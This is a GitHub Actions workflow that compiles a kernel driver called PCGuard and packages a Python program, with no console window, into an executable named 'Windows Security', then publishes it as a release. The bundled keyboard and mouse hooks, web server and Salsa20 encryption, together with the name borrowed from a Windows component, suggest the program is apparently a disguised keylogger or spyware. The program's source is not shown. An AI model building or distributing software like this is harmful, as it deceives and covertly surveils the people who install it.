name: Build PCGuard Driver + EXE

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install WDK
        shell: pwsh
        run: |
          $url = "https://go.microsoft.com/fwlink/?linkid=2249371"
          $out = "$env:TEMP\wdksetup.exe"
          Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
          Start-Process -FilePath $out -ArgumentList "/quiet /norestart /features OptionId.WindowsDriverKitComplete" -Wait
          Write-Host "WDK installed."

      - name: Find tools and build driver
        shell: pwsh
        run: |
          # Find cl.exe
          $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
          $vsPath  = & $vswhere -latest -products * -requires Microsoft.VisualCpp.Tools.HostX64.TargetX64 -property installationPath
          Write-Host "VS Path: $vsPath"

          # Find cl.exe and link.exe
          $clPath   = Get-ChildItem "$vsPath\VC\Tools\MSVC" -Recurse -Filter "cl.exe"   | Where-Object { $_.FullName -like "*x64\cl.exe"   } | Select-Object -First 1 -ExpandProperty FullName
          $linkPath = Get-ChildItem "$vsPath\VC\Tools\MSVC" -Recurse -Filter "link.exe" | Where-Object { $_.FullName -like "*x64\link.exe" } | Select-Object -First 1 -ExpandProperty FullName

          Write-Host "cl.exe:   $clPath"
          Write-Host "link.exe: $linkPath"

          # Find WDK version
          $kits = "C:\Program Files (x86)\Windows Kits\10\Include"
          $ver  = Get-ChildItem $kits | Sort-Object Name -Descending | Select-Object -First 1 -ExpandProperty Name
          Write-Host "WDK version: $ver"

          $inc = "C:\Program Files (x86)\Windows Kits\10\Include\$ver"
          $lib = "C:\Program Files (x86)\Windows Kits\10\Lib\$ver"

          # Create build dir and copy sources
          New-Item -ItemType Directory -Force -Path build_drv | Out-Null
          Copy-Item pc-guardian\driver\PCGuard.cpp build_drv\
          Copy-Item pc-guardian\driver\PCGuard.h   build_drv\
          Set-Location build_drv

          # Compile
          & "$clPath" /nologo /kernel /GS- /W3 /WX- /Gz /GF /EHsc /Zp8 /GR- `
            /D_AMD64_ /DNTDDI_VERSION=0x0A000007 /D_WIN32_WINNT=0x0A00 /DWIN32=100 /DDBG `
            "/I$inc\km" "/I$inc\shared" `
            /c PCGuard.cpp

          if ($LASTEXITCODE -ne 0) { Write-Error "Compile failed"; exit 1 }

          # Link
          & "$linkPath" /DRIVER /SUBSYSTEM:NATIVE /ENTRY:DriverEntry /NODEFAULTLIB `
            /MACHINE:X64 `
            "/LIBPATH:$lib\km\x64" `
            ntoskrnl.lib hal.lib wdm.lib wdmsec.lib `
            /OUT:PCGuard.sys PCGuard.obj

          if ($LASTEXITCODE -ne 0) { Write-Error "Link failed"; exit 1 }

          if (Test-Path PCGuard.sys) {
            Write-Host "PCGuard.sys built OK — $($(Get-Item PCGuard.sys).Length) bytes"
          } else {
            Write-Error "PCGuard.sys missing after link"
            exit 1
          }

      - name: Copy driver to assets
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force -Path pc-guardian\assets | Out-Null
          if (Test-Path build_drv\PCGuard.sys) {
            Copy-Item build_drv\PCGuard.sys pc-guardian\assets\PCGuard.sys
            Write-Host "Driver copied."
          } else {
            Write-Host "No driver built."
          }

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install Python deps
        shell: cmd
        run: pip install -r pc-guardian/requirements.txt pyinstaller pillow

      - name: Create folders
        shell: cmd
        run: |
          if not exist pc-guardian\logs   mkdir pc-guardian\logs
          if not exist pc-guardian\config mkdir pc-guardian\config

      - name: Build EXE
        shell: pwsh
        run: |
          $args = @(
            "--onefile", "--noconsole", "--clean",
            "--name", "Windows Security",
            "--icon", "pc-guardian/assets/app.ico",
            "--runtime-tmpdir", ".",
            "--hidden-import", "pynput.keyboard._win32",
            "--hidden-import", "pynput.mouse._win32",
            "--hidden-import", "win32api",
            "--hidden-import", "win32con",
            "--hidden-import", "win32gui",
            "--hidden-import", "win32com",
            "--hidden-import", "winerror",
            "--hidden-import", "comtypes",
            "--hidden-import", "flask",
            "--hidden-import", "cryptography",
            "--hidden-import", "Crypto",
            "--hidden-import", "Crypto.Cipher",
            "--hidden-import", "Crypto.Cipher.Salsa20",
            "--paths", "pc-guardian"
          )
          if (Test-Path "pc-guardian\assets\PCGuard.sys") {
            $args += "--add-data"
            $args += "pc-guardian/assets/PCGuard.sys;assets"
            Write-Host "Driver will be bundled."
          }
          $args += "pc-guardian/main.py"
          & pyinstaller @args
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: Get version
        id: version
        shell: pwsh
        run: |
          $date = Get-Date -Format "yyyy.MM.dd-HHmm"
          $sha  = "${{ github.sha }}".Substring(0,7)
          "tag=v$date-$sha"  >> $env:GITHUB_OUTPUT
          "name=Windows Security $date build $sha" >> $env:GITHUB_OUTPUT

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.version.outputs.tag }}
          name: ${{ steps.version.outputs.name }}
          body: |
            Built from ${{ github.sha }}
            ${{ github.event.head_commit.message }}
          files: "dist/Windows Security.exe"
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
